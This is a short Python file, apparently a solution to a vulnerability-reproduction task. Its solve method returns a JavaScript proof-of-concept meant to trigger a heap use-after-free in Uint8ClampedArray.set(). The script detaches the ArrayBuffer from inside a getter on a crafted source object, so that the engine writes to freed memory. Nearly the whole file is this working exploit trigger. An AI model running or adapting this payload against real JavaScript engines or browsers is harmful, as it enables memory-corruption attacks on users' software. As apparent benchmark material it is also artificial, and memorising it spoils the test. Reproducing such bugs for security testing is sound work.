import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Uint8ClampedArray.
        The vulnerability allows the underlying ArrayBuffer to be detached in the middle of a
        .set() operation via a malicious getter, causing a write to freed memory.
        """
        # Minimal JavaScript PoC
        # 1. Create ArrayBuffer and Uint8ClampedArray
        # 2. Call .set() with a source object that has a getter
        # 3. Inside the getter, detach the ArrayBuffer
        # 4. The .set() implementation continues and writes to the freed buffer
        
        poc = (
            b"var buf = new ArrayBuffer(0x1000);\n"
            b"var arr = new Uint8ClampedArray(buf);\n"
            b"var evil = {\n"
            b"    length: 10,\n"
            b"    get 0() {\n"
            b"        try {\n"
            b"            detachArrayBuffer(buf);\n"
            b"        } catch (e) {\n"
            b"            try {\n"
            b"                structuredClone(buf, { transfer: [buf] });\n"
            b"            } catch (e2) {}\n"
            b"        }\n"
            b"        return 0x41;\n"
            b"    }\n"
            b"};\n"
            b"try {\n"
            b"    arr.set(evil);\n"
            b"} catch (e) {}\n"
        )
        return poc